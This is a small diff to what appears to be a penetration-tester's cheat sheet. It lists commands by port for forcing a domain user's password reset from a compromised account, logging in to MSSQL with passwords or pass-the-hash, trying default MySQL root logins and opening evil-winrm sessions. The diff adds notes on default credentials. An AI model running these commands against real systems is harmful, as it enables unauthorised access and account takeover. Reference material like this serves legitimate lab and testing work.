@@ -50,6 +50,7 @@ net rpc password "TargetUser" "NewP@ssw0rd" -U "contoso"/"pwned-user"%"St0ng123"
 net rpc password "TargetUser" -U "contoso"/"pwned-user"%"St0ng123" -S "DC-IP-Here"
 
 ### Port 1433 (MSSQL)
+Default user is sa
 mssqlclient -p 1433 $shortdomain/$user:$password@$rhost #1433
 mssqlclient -p 1433 $user:$password@$rhost -windows-auth #1433
 mssqlclient -p 1433 $user@$rhost -windows-auth #1433
@@ -57,7 +58,7 @@ mssqlclient -p 1433 -hashes LMHASH:NTHASH $shortdomain/$user:$password@192.168.1
 
 ### Port 3306 (MySQL)
 mysql -h $rhost -u $user #3306
-mysql -h $rhost -u root #3306
+mysql -h $rhost -u root #3306 default no password
 
 ### Port 5985 (WinRM)
 evil-winrm -i $rhost -u $user -p $password #5985
